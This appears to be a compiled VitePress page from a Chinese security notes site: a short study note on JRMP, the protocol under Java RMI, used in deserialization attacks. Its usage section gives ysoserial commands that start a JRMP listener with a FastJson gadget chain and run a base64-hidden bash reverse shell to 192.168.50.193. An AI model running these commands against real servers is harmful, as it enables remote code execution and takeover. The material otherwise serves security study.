import{_ as n,c as l,J as e,m as a,a as t,V as c,o as p,E as s}from"./chunks/framework.WH0rnJL5.js";const k=JSON.parse('{"title":"JRMP总结","description":"","frontmatter":{},"headers":[],"relativePath":"笔记/👮🏻网络安全/Java/反序列化/Basic/JRMP总结.md","filePath":"笔记/👮🏻网络安全/Java/反序列化/Basic/JRMP总结.md"}'),d={name:"笔记/👮🏻网络安全/Java/反序列化/Basic/JRMP总结.md"},h=a("h1",{id:"jrmp总结",tabindex:"-1"},[t("JRMP总结 "),a("a",{class:"header-anchor",href:"#jrmp总结","aria-label":'Permalink to "JRMP总结"'},"​")],-1),_=c('<h2 id="_1-jrmp" tabindex="-1">1.JRMP <a class="header-anchor" href="#_1-jrmp" aria-label="Permalink to &quot;1.JRMP&quot;">​</a></h2><p>JRMP是Java远程方法协议，该协议基于TCP/IP之上，RMI协议之下，使用RMI协议的时传递的底层使用的JRMP，JRMP协议底层是基于TCP/IP。</p><p>RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议，当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议其实也是基于RMI进行实现的。</p><h2 id="_2-使用方式" tabindex="-1">2.使用方式 <a class="header-anchor" href="#_2-使用方式" aria-label="Permalink to &quot;2.使用方式&quot;">​</a></h2><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient &quot;192.168.50.193:8888&quot; | base64</span></span></code></pre></div><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 FastJson1 &quot;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguNTAuMTkzLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}&quot;</span></span></code></pre></div><h2 id="_3-原理分析" tabindex="-1">3.原理分析 <a class="header-anchor" href="#_3-原理分析" aria-label="Permalink to &quot;3.原理分析&quot;">​</a></h2><h2 id="贡献者" tabindex="-1">贡献者 <a class="header-anchor" href="#贡献者" aria-label="Permalink to &quot;贡献者&quot;">​</a></h2>',8),P=a("h2",{id:"文件历史",tabindex:"-1"},[t("文件历史 "),a("a",{class:"header-anchor",href:"#文件历史","aria-label":'Permalink to "文件历史"'},"​")],-1);function b(m,u,M,J,R,g){const o=s("NolebasePageProperties"),i=s("NolebaseGitContributors"),r=s("NolebaseGitChangelog");return p(),l("div",null,[h,e(o),_,e(i),P,e(r)])}const N=n(d,[["render",b]]);export{k as __pageData,N as default};
